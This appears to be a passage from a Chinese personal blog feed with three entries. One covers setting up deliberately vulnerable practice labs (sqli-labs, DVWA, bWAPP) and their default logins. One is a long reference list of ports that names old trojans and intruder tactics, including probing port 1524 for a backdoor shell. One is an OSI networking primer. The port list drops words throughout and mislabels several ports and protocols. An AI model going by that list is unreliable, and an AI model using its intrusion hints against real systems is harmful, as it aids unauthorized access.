href="#SQL-Injection-2" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h2 id="SQL-Injection-Blind-2"><a href="#SQL-Injection-Blind-2" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><h2 id="XSS-2"><a href="#XSS-2" class="headerlink" title="XSS"></a>XSS</h2>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>靶场搭建问题</title>
    <link href="/2020/12/08/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98/"/>
    <url>/2020/12/08/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>平台：DVWA sqli-labs upload-labs xss-labs xxe-labs ssrf-labs bwapp</p><h1 id="SQLi-LABS"><a href="#SQLi-LABS" class="headerlink" title="SQLi-LABS"></a>SQLi-LABS</h1><p>搭建出现的问题，由于PHPstudy的版本原因，搭建出现问题，需要更改数据库名，更改面积大，直接虚拟机开低版本搭建<br>学长语：直接解压sqli-labs到www根目录下就行了啊<br>我…还真是，上图<br><img src="https://img-blog.csdnimg.cn/2020112408582051.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201124102250936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>注意：需要更改sqli-labs-master\sql-connections下的db-creds.inc，设置登录密码。</p><h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p><img src="https://img-blog.csdnimg.cn/20201206145227918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_16,color_FFFFFF,t_70"><br><code>Ⅰ需要修改当前php版本里的php.ini配置文件 更改allow_url_include = off 为On ==（吐了，大写的O）== 而且要重启php服务 Ⅱ绑定域名，进行本地DNS更新，网上查找www.DVWA.com的密钥</code><br>网站初次登入密码:admin/password</p><h1 id="BWAPP"><a href="#BWAPP" class="headerlink" title="BWAPP"></a>BWAPP</h1><p>进入bwapp里admin，更改settings更改密码<br>登录网站后出现<code>Connection failed: Unknown database &#39;bWAPP&#39;</code><br>进入localhost/bwap/install.php,点击here<br>网站初次登入密码：bee/bug</p>]]></content>
    
    
    <categories>
      
      <category>debug</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见端口及其服务</title>
    <link href="/2020/12/04/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E6%9C%8D%E5%8A%A1/"/>
    <url>/2020/12/04/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<p>  0<br>  Reserved<br>  通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效 ，当你试图使用通常的闭合 连接它时将产生不同的结果。一种典型的扫描，使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。<br>  1<br>  tcpmux<br>  这显示有人在寻找SGI Irix机器。Irix是实现tcpmux的主要提供者，默认情况下tcpmux在这种系统中被打开。Irix机器在发布是含有几个默认的无密码的帐户，如 IP、GUEST UUCP、NUUCP、DEMOS 、TUTOR、DIAG、OUTOFBOX等。许多管理员在安装后忘记删除这些帐户。因此HACKER在INTERNET上搜索tcpmux并利用这些帐户。</p><p>  7<br>  Echo<br>  能看到许多人搜索Fraggle放大器时，发送到X.X.X.0和X.X.X.255的信息。</p><p>  19<br>  Character Generator<br>  这是一种仅仅发送字符的 。UDP版本将会在收到UDP包后回应含有垃圾字符的包。TCP连接时会发送含有垃圾字符的数据流直到连接关闭。HACKER利用IP欺骗可以发动DoS攻击。伪造两个chargen 器之间的UDP包。同样Fraggle DoS攻击向目标地址的这个 广播一个带有伪造受害者IP的数据包，受害者为了回应这些数据而过载。</p><p>  21<br>  FTP<br>  FTP 器所开放的 ，用于上传、下载。最常见的攻击者用于寻找打开anonymous的FTP 器的方法。这些 器带有可读写的目录。木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的 。</p><p>  22<br>  Ssh<br>  PcAnywhere建立的TCP和这一 的连接可能是为了寻找ssh。这一 有许多弱点，如果配置成特定的模式，许多使用RSAREF库的版本就会有不少的漏洞存在。</p><p>  23<br>  Telnet<br>  远程登录，入侵者在搜索远程登录UNIX的 。大多数情况下扫描这一 是为了找到机器运行的操作系统。还有使用其他技术，入侵者也会找到密码。木马Tiny Telnet Server就开放这个 。</p><p>  25<br>  SMTP<br>  SMTP 器所开放的 ，用于发送邮件。入侵者寻找SMTP 器是为了传递他们的SPAM。入侵者的帐户被关闭，他们需要连接到高带宽的E-MAIL 器上，将简单的信息传递到不同的地址。木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个 。</p><p>  31<br>  MSG Authentication<br>  木马Master Paradise、Hackers Paradise开放此 。</p><p>  42<br>  WINS Replication<br>  WINS复制</p><p>  53<br>  Domain Name Server（DNS）<br>  DNS 器所开放的 ，入侵者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此防火墙常常过滤或记录此 。</p><p>  67<br>  Bootstrap Protocol Server<br>  通过DSL和Cable modem的防火墙常会看见大量发送到广播地址255.255.255.255的数据。这些机器在向DHCP 器请求一个地址。HACKER常进入它们，分配一个地址把自己作为局部路由器而发起大量中间人（man-in-middle）攻击。客户端向68 广播请求配置， 器向67 广播回应请求。这种回应使用广播是因为客户端还不知道可以发送的IP地址。</p><p>  69<br>  Trival File Transfer<br>  许多 器与bootp一起提供这项 ，便于从系统下载启动代码。但是它们常常由于错误配置而使入侵者能从系统中窃取任何 文件。它们也可用于系统写入文件。</p><p>  79<br>  Finger Server<br>  入侵者用于获得用户信息，查询操作系统，探测已知的缓冲区溢出错误，回应从自己机器到其他机器Finger扫描。</p><p>  80<br>  HTTP<br>  用于网页浏览。木马Executor开放此 。</p><p>  99<br>  Metagram Relay<br>  后门程序ncx99开放此 。</p><p>  102<br>  Message transfer agent(MTA)-X.400 over TCP/IP<br>  消息传输代理。</p><p>  109<br>  Post Office Protocol -Version3<br>  POP3 器开放此 ，用于接收邮件，客户端访问 器端的邮件 。POP3 有许多公认的弱点。关于用户名和密码交 换缓冲区溢出的弱点至少有20个，这意味着入侵者可以在真正登陆前进入系统。成功登陆后还有其他缓冲区溢出错误。</p><p>  110<br>  SUN公司的RPC 所有<br>  常见RPC 有rpc.mountd、NFS、rpc.statd、rpc.csmd、rpc.ttybd、amd等</p><p>  113<br>  Authentication Service<br>  这是一个许多计算机上运行的协议，用于鉴别TCP连接的用户。使用标准的这种 可以获得许多计算机的信息。但是它可作为许多 的记录器，尤其是FTP、POP、IMAP、SMTP和IRC等 。通常如果有许多客户通过防火墙访问这些 ，将会看到许多这个 的连接请求。记住，如果阻断这个 客户端会感觉到在防火墙另一边与E-MAIL 器的缓慢连接。许多防火墙支持TCP连接的阻断过程中发回RST。这将会停止缓慢的连接。</p><p>  119<br>  Network News Transfer Protocol<br>  NEWS新闻组传输协议，承载USENET通信。这个 的连接通常是人们在寻找USENET 器。多数ISP限制，只有他们的客户才能访问他们的新闻组 器。打开新闻组 器将允许发/读任何人的帖子，访问被限制的新闻组 器，匿名发帖或发送SPAM。</p><p>  135<br>  Location Service<br>  Microsoft在这个 运行DCE RPC end-point mapper为它的DCOM 。这与UNIX 111 的功能很相似。使用DCOM和RPC的 利用计算机上的end-point mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point mapper找到 的位置。HACKER扫描计算机的这个 是为了找到这个计算机上运行Exchange Server吗？什么版本？还有些DOS攻击直接针对这个 。</p><p>  137、138、139<br>  NETBIOS Name Service<br>  其中137、138是UDP ，当通过网上邻居传输文件时用这个 。而139  通过这个 进入的连接试图获得NetBIOS/SMB 。这个协议被用于windows文件和打印机共享和SAMBA。还有WINS Regisrtation也用它。</p><p>  143<br>  Interim Mail Access Protocol v2<br>  和POP3的安全问题一样，许多IMAP 器存在有缓冲区溢出漏洞。记住 一种LINUX蠕虫（admv0rm）会通过这个 繁殖，因此许多这个 的扫描来自不知情的已经被感染的用户。当REDHAT在他们的LINUX发布版本中默认允许IMAP后，这些漏洞变的很流行。这一 还被用于IMAP2，但并不流行。</p><p>  161<br>  SNMP<br>  SNMP允许远程管理设备。所有配置和运行信息的储存在数据库中，通过SNMP可获得这些信息。许多管理员的错误配置将被暴露在Internet。Cackers将试图使用默认的密码public、private访问系统。他们可能会试验所有可能的组合。SNMP包可能会被错误的指向用户的网络。</p><p>  177<br>  X Display Manager Control Protocol<br>  许多入侵者通过它访问X-windows操作台，它同时需要打开6000 。</p><p>  389<br>  LDAP、ILS<br>  轻型目录访问协议和NetMeeting Internet Locator Server共用这一 。</p><p>  443<br>  Https<br>  网页浏览 ，能提供加密和通过安全 传输的另一种HTTP。</p><p>  456<br>  [NULL]<br>  木马HACKERS PARADISE开放此 。</p><p>  513<br>  Login,remote login<br>  是从使用cable modem或DSL登陆到子网中的UNIX计算机发出的广播。这些人为入侵者进入他们的系统提供了信息。</p><p>  544<br>  [NULL]<br>  kerberos kshell</p><p>  548<br>  Macintosh,File Services(AFP/IP)<br>  Macintosh,文件 。</p><p>  553<br>  CORBA IIOP （UDP）<br>  使用cable modem、DSL或VLAN将会看到这个 的广播。CORBA是一种面向对象的RPC系统。入侵者可以利用这些信息进入系统。</p><p>  555<br>  DSF<br>  木马PhAse1.0、Stealth Spy、IniKiller开放此 。</p><p>  568<br>  Membership DPA<br>  成员资格 DPA。</p><p>  569<br>  Membership MSN<br>  成员资格 MSN。</p><p>  635<br>  mountd<br>  Linux的mountd Bug。这是扫描的一个流行BUG。大多数对这个 的扫描是基于UDP的，但是基于TCP的mountd有所增加（mountd同时运行于两个 ）。记住mountd可运行于任何 （到底是哪个 ，需要在 111做portmap查询），只是Linux默认 是635，就像NFS通常运行于2049 。</p><p>  636<br>  LDAP<br>  SSL（Secure Sockets layer）</p><p>  666<br>  Doom Id Software<br>  木马Attack FTP、Satanz Backdoor开放此 </p><p>  993<br>  IMAP<br>  SSL（Secure Sockets layer）</p><p>  1001、1011<br>  [NULL]<br>  木马Silencer、WebEx开放1001 。木马Doly Trojan开放1011 。</p><p>  1024<br>  Reserved<br>  它是动态 的开始，许多程序并不在乎用哪个 连接网络，它们请求系统为它们分配下一个闲置 。基于这一点分配从 1024开始。这就是说第一个向系统发出请求的会分配到1024 。你可以重启机器，打开Telnet，再打开一个窗口运行natstat -a 将会看到Telnet被分配1024 。还有SQL session也用此 和5000 。</p><p>  1025、1033<br>  1025 network blackjack 1033 [NULL]<br>  木马netspy开放这2个 。</p><p>  1080<br>  SOCKS<br>  这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET。理论上它应该只允许内部的通信向外到达INTERNET。但是由于错误的配置，它会允许位于防火墙外部的攻击穿过防火墙。WinGate常会发生这种错误，在加入IRC聊天室时常会看到这种情况。<br>  1170<br>  [NULL]<br>  木马Streaming Audio Trojan、Psyber Stream Server、Voice开放此 。</p><p>  1234、1243、6711、6776<br>  [NULL]<br>  木马SubSeven2.0、Ultors Trojan开放1234、6776 。木马SubSeven1.0/1.9开放1243、6711、6776 。</p><p>  1245<br>  [NULL]<br>  木马Vodoo开放此 。</p><p>  1433<br>  SQL<br>  Microsoft的SQL 开放的 。</p><p>  1492<br>  stone-design-1<br>  木马FTP99CMP开放此 。</p><p>  1500<br>  RPC client fixed port session queries<br>  RPC客户固定 会话查询</p><p>  1503<br>  NetMeeting T.120<br>  NetMeeting T.120</p><p>  1524<br>  ingress<br>  许多攻击脚本将安装一个后门SHELL于这个 ，尤其是针对SUN系统中Sendmail和RPC 漏洞的脚本。如果刚安装了防火墙就看到在这个 上的连接企图，很可能是上述原因。可以试试Telnet到用户的计算机上的这个 ，看看它是否会给你一个SHELL。连接到600/pcserver也存在这个问题。</p><p>  1600<br>  issd<br>  木马Shivka-Burka开放此 。</p><p>  1720<br>  NetMeeting<br>  NetMeeting H.233 call Setup。</p><p>  1731<br>  NetMeeting Audio Call Control<br>  NetMeeting音频调用控制。</p><p>  1807<br>  [NULL]<br>  木马SpySender开放此 。</p><p>  1981<br>  [NULL]<br>  木马ShockRave开放此 。</p><p>  1999<br>  cisco identification port<br>  木马BackDoor开放此 。</p><p>  2000<br>  [NULL]<br>  木马GirlFriend 1.3、Millenium 1.0开放此 。</p><p>  2001<br>  [NULL]<br>  木马Millenium 1.0、Trojan Cow开放此 。</p><p>  2023<br>  xinuexpansion 4<br>  木马Pass Ripper开放此 。</p><p>  2049<br>  NFS<br>  NFS程序常运行于这个 。通常需要访问Portmapper查询这个 运行于哪个 。</p><p>  2115<br>  [NULL]<br>  木马Bugs开放此 。</p><p>  2140、3150<br>  [NULL]<br>  木马Deep Throat 1.0/3.0开放此 。</p><p>  2500<br>  RPC client using a fixed port session replication<br>  应用固定 会话复制的RPC客户</p><p>  2583<br>  [NULL]<br>  木马Wincrash 2.0开放此 。</p><p>  2801<br>  [NULL]<br>  木马Phineas Phucker开放此 。</p><p>  3024、4092<br>  [NULL]<br>  木马WinCrash开放此 。</p><p>  3128<br>  squid<br>  这是squid HTTP代理 器的默认 。攻击者扫描这个 是为了搜寻一个代理 器而匿名访问Internet。也会看到搜索其他代理 器的 8000、8001、8080、8888。扫描这个 的另一个原因是用户正在进入聊天室。其他用户也会检验这个 以确定用户的机器是否支持代理。</p><p>  3129<br>  [NULL]<br>  木马Master Paradise开放此 。</p><p>  3150<br>  [NULL]<br>  木马The Invasor开放此 。</p><p>  3210、4321<br>  [NULL]<br>  木马SchoolBus开放此 </p><p> 3306<br>  [NULL]<br>  mysql</p><p>  3333<br>  dec-notes<br>  木马Prosiak开放此 </p><p>  3389<br>  超级终端<br>  WINDOWS 2000终端开放此 。</p><p>  3700<br>  [NULL]<br>  木马Portal of Doom开放此 </p><p>  3996、4060<br>  [NULL]<br>  木马RemoteAnything开放此 </p><p>  4000<br>  QQ客户端<br>  腾讯QQ客户端开放此 。</p><p>  4092<br>  [NULL]<br>  木马WinCrash开放此 。</p><p>  4590<br>  [NULL]<br>  木马ICQTrojan开放此 。</p><p>  5000、5001、5321、50505<br>  [NULL]<br>  木马blazer5开放5000 。木马Sockets de Troie开放5000、5001、5321、50505 。</p><p>  5400、5401、5402<br>  [NULL]<br>  木马Blade Runner开放此 。</p><p>  5550<br>  [NULL]<br>  木马xtcp开放此 。</p><p>  5569<br>  [NULL]<br>  木马Robo-Hack开放此 。</p><p>  5632<br>  pcAnywere<br>  有时会看到很多这个 的扫描，这依赖于用户所在的位置。当用户打开pcAnywere时，它会自动扫描局域网C类网以寻找可能的代理（这里的代理是指agent而不是proxy）。入侵者也会寻找开放这种 的计算机。，所以应该查看这种扫描的源地址。一些搜寻pcAnywere的扫描包常含 22的UDP数据包。</p><p>  5742<br>  [NULL]<br>  木马WinCrash1.03开放此 。</p><p>  6267<br>  [NULL]<br>  木马广外女生开放此 。</p><p>  6400<br>  [NULL]<br>  木马The tHing开放此 。</p><p>  6670、6671<br>  [NULL]<br>  木马Deep Throat开放6670 。而Deep Throat 3.0开放6671 。</p><p>  6883<br>  [NULL]<br>  木马DeltaSource开放此 。</p><p>  6969<br>  [NULL]<br>  木马Gatecrasher、Priority开放此 。</p><p>  6970<br>  RealAudio<br>  RealAudio客户将从 器的6970-7170的UDP 接收音频数据流。这是由TCP-7070 外向控制连接设置的。</p><p>  7000<br>  [NULL]<br>  木马Remote Grab开放此 。</p><p>  7300、7301、7306、7307、7308<br>  [NULL]<br>  木马NetMonitor开放此 。另外NetSpy1.0也开放7306 。</p><p>  7323<br>  [NULL]<br>  Sygate 器端。</p><p>  7626<br>  [NULL]<br>  木马Giscier开放此 。</p><p>  7789<br>  [NULL]<br>  木马ICKiller开放此 。</p><p>  8000<br>  OICQ<br>  腾讯QQ 器端开放此 。</p><p>  8010<br>  Wingate<br>  Wingate代理开放此 。</p><p>  8080<br>  代理<br>  WWW代理开放此 。</p><p>  9400、9401、9402<br>  [NULL]<br>  木马Incommand 1.0开放此 。</p><p>  9872、9873、9874、9875、10067、10167<br>  [NULL]<br>  木马Portal of Doom开放此 。</p><p>  9989<br>  [NULL]<br>  木马iNi-Killer开放此 。</p><p>  11000<br>  [NULL]<br>  木马SennaSpy开放此 。</p><p>  11223<br>  [NULL]<br>  木马Progenic trojan开放此 。</p><p>  12076、61466<br>  [NULL]<br>  木马Telecommando开放此 。<br>page]<br>  12223<br>  [NULL]<br>  木马Hack’99 KeyLogger开放此 。</p><p>  12345、12346<br>  [NULL]<br>  木马NetBus1.60/1.70、GabanBus开放此 。</p><p>  12361<br>  [NULL]<br>  木马Whack-a-mole开放此 。</p><p>  13223<br>  PowWow<br>  PowWow是Tribal Voice的聊天程序。它允许用户在此 打开私人聊天的连接。这一程序对于建立连接非常具有攻击性。它会驻扎在这个TCP 等回应。造成类似心跳间隔的连接请求。如果一个拨号用户从另一个聊天者手中继承了IP地址就会发生好象有很多不同的人在测试这个 的情况。这一协议使用OPNG作为其连接请求的前4个字节。</p><p>  16969<br>  [NULL]<br>  木马Priority开放此 。</p><p>  17027<br>  Conducent<br>  这是一个外向连接。这是由于公司内部有人安装了带有Conducent”adbot”的共享软件。Conducent”adbot”是为共享软件显示广告 的。使用这种 的一种流行的软件是Pkware。</p><p>  19191<br>  [NULL]<br>  木马蓝色火焰开放此 。</p><p>  20000、20001<br>  [NULL]<br>  木马Millennium开放此 。</p><p>  20034<br>  [NULL]<br>  木马NetBus Pro开放此 。</p><p>  21554<br>  [NULL]<br>  木马GirlFriend开放此 。</p><p>  22222<br>  [NULL]<br>  木马Prosiak开放此 。</p><p>  23456<br>  [NULL]<br>  木马Evil FTP、Ugly FTP开放此 。</p><p>  26274、47262<br>  [NULL]<br>  木马Delta开放此 。</p><p>  27374<br>  [NULL]<br>  木马Subseven 2.1开放此 。</p><p>  30100<br>  [NULL]<br>  木马NetSphere开放此 。</p><p>  30303<br>  [NULL]<br>  木马Socket23开放此 。</p><p>  30999<br>  [NULL]<br>  木马Kuang开放此 。</p><p>  31337、31338<br>  [NULL]<br>  木马BO(Back Orifice)开放此 。另外木马DeepBO也开放31338 。</p><p>  31339<br>  [NULL]<br>  木马NetSpy DK开放此 。</p><p>  31666<br>  [NULL]<br>  木马BOWhack开放此 。</p><p>  33333<br>  [NULL]<br>  木马Prosiak开放此 。</p><p>  34324<br>  [NULL]<br>  木马Tiny Telnet Server、BigGluck、TN开放此 。</p><p>  40412<br>  [NULL]<br>  木马The Spy开放此 。</p><p>  40421、40422、40423、40426、<br>  [NULL]<br>  木马Masters Paradise开放此 。</p><p>  43210、54321<br>  [NULL]<br>  木马SchoolBus 1.0/2.0开放此 。</p><p>  44445<br>  [NULL]<br>  木马Happypig开放此 。</p><p>  50766<br>  [NULL]<br>  木马Fore开放此 。</p><p>  53001<br>  [NULL]<br>  木马Remote Windows Shutdown开放此 。</p><p>  65000<br>  [NULL]<br>  木马Devil 1.03开放此 。</p><p>  88<br>  Kerberos krb5。另外TCP的88 也是这个用途。</p><p>  137<br>  SQL Named Pipes encryption over other protocols name lookup(其他协议名称查找上的SQL命名管道加密技术)和SQL RPC encryption over other protocols name lookup(其他协议名称查找上的SQL RPC加密技术)和Wins NetBT name service(WINS NetBT名称 )和Wins Proxy都用这个 。</p><p>  161<br>  Simple Network Management Protocol(SMTP)（简单网络管理协议）。</p><p>  162<br>  SNMP Trap（SNMP陷阱）</p><p>  445<br>  Common Internet File System(CIFS)（公共Internet文件系统）</p><p>  464<br>  Kerberos kpasswd(v5)。另外TCP的464 也是这个用途。</p><p>  500<br>  Internet Key Exchange(IKE)（Internet密钥交换）</p><p>  1645、1812<br>  Remot Authentication Dial-In User Service(RADIUS)authentication(Routing and Remote Access)(远程认证拨号用户 )</p><p>  1646、1813<br>  RADIUS accounting(Routing and Remote Access)(RADIUS记帐（路由和远程访问）)</p><p>  1701<br>  Layer Two Tunneling Protocol(L2TP)(第2层隧道协议)</p><p>  1801、3527<br>  Microsoft Message Queue Server(Microsoft消息队列 器)。还有TCP的135、1801、2101、2103、2105也是同样的用途。</p><p>  2504<br>  Network Load Balancing(网络平衡负荷)</p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络基础</title>
    <link href="/2020/12/04/%E8%AE%A1%E7%BD%91/"/>
    <url>/2020/12/04/%E8%AE%A1%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<h1 id="一、网络模型"><a href="#一、网络模型" class="headerlink" title="一、网络模型"></a>一、网络模型</h1><p>不同划分方式下的网络体系模型<br><img src="https://img-blog.csdnimg.cn/20201203132129490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20201203133326473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20201203224110893.gif"></p><hr><h1 id="二、各层介绍"><a href="#二、各层介绍" class="headerlink" title="二、各层介绍"></a>二、各层介绍</h1><p>1）<strong>物理层（Physical Layer）</strong></p><p>激活、维持、关闭通信端点之间的机械特性、电气特性、功能特性以及过程特性。该层为上层协议提供了一个传输数据的可靠的物理媒体。简单的说，物理层确保原始的数据可在各种物理媒体上传输。物理层记住两个重要的设备名称，中继器（Repeater，也叫放大器）和集线器。</p><p>2）<strong>数据链路层（Data Link Layer）</strong></p><p>数据链路层在物理层提供的服务的基础上向网络层提供服务，其最基本的服务是将源自网络层来的数据可靠地传输到相邻节点的目标机网络层。为达到这一目的，数据链路必须具备一系列相应的功能，主要有：如何将数据组合成数据块，在数据链路层中称这种数据块为帧（frame），帧是数据链路层的传送单位；如何控制帧在物理信道上的传输，包括如何处理传输差错，如何调节发送速率以使与接收方相匹配；以及在两个网络实体之间提供数据链路通路的建立、维持和释放的管理。数据链路层在不可靠的物理介质上提供可靠的传输。该层的作用包括：物理地址寻址、数据的成帧、流量控制、数据的检错、重发等。</p><ul><li>数据链路层为网络层提供可靠的数据传输；</li><li>基本数据单位为帧；</li><li>主要的协议：<strong>以太网协议</strong>；</li><li>两个重要设备名称：网桥和交换机。</li></ul><p>3）<strong>网络层（Network Layer）</strong></p><p>网络层的目的是实现两个端系统之间的数据透明传送，具体功能包括寻址和路由选择、连接的建立、保持和终止等。它提供的服务使传输层不需要了解网络中的数据传输和交换技术。如果您想用尽量少的词来记住网络层，那就是“路径选择、路由及逻辑寻址”。</p><p>网络层中涉及众多的协议，其中包括最重要的协议，也是TCP/IP的核心协议——IP协议。IP协议非常简单，仅仅提供不可靠、无连接的传送服务。IP协议的主要功能有：无连接数据报传输、数据报路由选择和差错控制。与IP协议配套使用实现其功能的还有地址解析协议ARP、逆地址解析协议RARP、因特网报文协议ICMP、因特网组管理协议IGMP。</p><ul><li>网络层负责对子网间的数据包进行路由选择。此外，网络层还可以实现拥塞控制、网际互连等功能；</li><li>基本数据单位为IP数据报；</li><li>包含的主要协议：<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">IP协议（Internet Protocol，因特网互联协议）<span class="hljs-comment">;</span><br><br>ICMP协议（Internet Control Message Protocol，因特网控制报文协议）<span class="hljs-comment">;</span><br><br>ARP协议（Address Resolution Protocol，地址解析协议）<span class="hljs-comment">;</span><br><br>RARP协议（Reverse Address Resolution Protocol，逆地址解析协议）。<br></code></pre></td></tr></table></figure></li><li>重要的设备：路由器。</li></ul><p>4）<strong>传输层（Transport Layer）</strong></p><p>第一个端到端，即主机到主机的层次。传输层负责将上层数据分段并提供端到端的、可靠的或不可靠的传输。此外，传输层还要处理端到端的差错控制和流量控制问题。</p><p>传输层的任务是根据通信子网的特性，最佳的利用网络资源，为两个端系统的会话层之间，提供建立、维护和取消传输连接的功能，负责端到端的可靠数据传输。在这一层，信息传送的协议数据单元称为段或报文。</p><p>网络层只是根据网络地址将源结点发出的数据包传送到目的结点，而传输层则负责将数据可靠地传送到相应的端口。</p><ul><li><p>传输层负责将上层数据分段并提供端到端的、可靠的或不可靠的传输以及端到端的差错控制和流量控制问题；</p></li><li><p>包含的主要协议：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">TCP协议（Transmission Control Protocol，传输控制协议）<br>UDP协议（<span class="hljs-keyword">User</span> <span class="hljs-title">Datagram</span> Protocol，用户数据报协议）<br></code></pre></td></tr></table></figure></li></ul><ul><li>重要设备：网关。</li></ul><p>5）<strong>会话层</strong></p><p>会话层管理主机之间的会话进程，即负责建立、管理、终止进程之间的会话。会话层还利用在数据中插入校验点来实现数据的同步。</p><p>6）<strong>表示层</strong></p><p>表示层对上层数据或信息进行变换以保证一个主机应用层信息可以被另一个主机的应用程序理解。表示层的数据转换包括数据的加密、压缩、格式转换等。</p><p>7）<strong>应用层</strong></p><p>为操作系统或网络应用程序提供访问网络服务的接口。</p><p>会话层、表示层和应用层注意：</p><ul><li><p>数据传输基本单位为报文；</p></li><li><p>包含的主要协议：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">FTP（文件传送协议）<br>Telnet（远程登录协议）<br>DNS（域名解析协议）<br>SMTP（邮件传送协议）<br>POP3协议（邮局协议）<br>HTTP协议（Hyper <span class="hljs-built_in">Text</span> Transfer Protocol）<br></code></pre></td></tr></table></figure></li></ul><hr><h1 id="三、硬件总结"><a href="#三、硬件总结" class="headerlink" title="三、硬件总结"></a>三、硬件总结</h1><p>1）交换机<br>在计算机网络系统中，交换机是针对共享工作模式的弱点而推出的。交换机拥有一条高带宽的背部总线和内部交换矩阵。交换机的所有的端口都挂接在这条背 部总线上，当控制电路收到数据包以后，处理端口会查找内存中的地址对照表以确定目的MAC（网卡的硬件地址）的NIC（网卡）挂接在哪个端口上，通过内部 交换矩阵迅速将数据包传送到目的端口。目的MAC若不存在，交换机才广播到所有的端口，接收端口回应后交换机会“学习”新的地址，并把它添加入内部地址表中。交换机工作于OSI参考模型的第二层，即数据链路层。交换机内部的CPU会在每个端口成功连接时，通过ARP协议学习它的MAC地址，保存成一张 ARP表。在今后的通讯中，发往该MAC地址的数据包将仅送往其对应的端口，而不是所有的端口。因此，交换机可用于划分数据链路层广播，即冲突域；但它不 能划分网络层广播，即广播域。交换机被广泛应用于二层网络交换，俗称“二层交换机”。交换机的种类有：二层交换机、三层交换机、四层交换机、七层交换机分别工作在OSI七层模型中的第二层、第三层、第四层盒第七层，并因此而得名。</p><p>2）路由器<br>路由器（Router）是一种计算机网络设备，提供了路由与转送两种重要机制，可以决定数据包从来源端到目的端所经过 的路由路径（host到host之间的传输路径），这个过程称为路由；将路由器输入端的数据包移送至适当的路由器输出端(在路由器内部进行)，这称为转送。路由工作在OSI模型的第三层——即网络层，例如网际协议。路由器的一个作用是连通不同的网络，另一个作用是选择信息传送的线路。 路由器与交换器的差别，路由器是属于OSI第三层的产品，交换器是OSI第二层的产品(这里特指二层交换机)。</p><p>3）网关<br>网关（Gateway），网关顾名思义就是连接两个网络的设备，区别于路由器（由于历史的原因，许多有关TCP/IP 的文献曾经把网络层使用的路由器（Router）称为网关，在今天很多局域网采用都是路由来接入网络，因此现在通常指的网关就是路由器的IP），经常在家 庭中或者小型企业网络中使用，用于连接局域网和Internet。 网关也经常指把一种协议转成另一种协议的设备，比如语音网关。</p><h1 id="四、-协议总结"><a href="#四、-协议总结" class="headerlink" title="四、 协议总结"></a>四、 协议总结</h1><p>物理层：RJ45、CLOCK、IEEE802.3    （中继器，集线器，网关）<br>数据链路：PPP、FR、HDLC、VLAN、MAC  （网桥，交换机）<br>网络层：<strong>IP</strong>、ICMP、<strong>ARP</strong>、RARP、OSPF、IPX、RIP、IGRP、 （路由器）<br>传输层：<strong>TCP</strong>、<strong>UDP</strong>、SPX<br>会话层：NFS、<strong>SQL</strong>、NETBIOS、RPC<br>表示层：JPEG、MPEG、ASII<br>应用层：<strong>FTP</strong>、<strong>DNS</strong>、Telnet、SMTP、<strong>HTTP</strong>、<strong>WWW</strong>、NFS</p><hr><h1 id="五、对协议的梳理"><a href="#五、对协议的梳理" class="headerlink" title="五、对协议的梳理"></a>五、对协议的梳理</h1><h2 id="MAC与IP间的协议"><a href="#MAC与IP间的协议" class="headerlink" 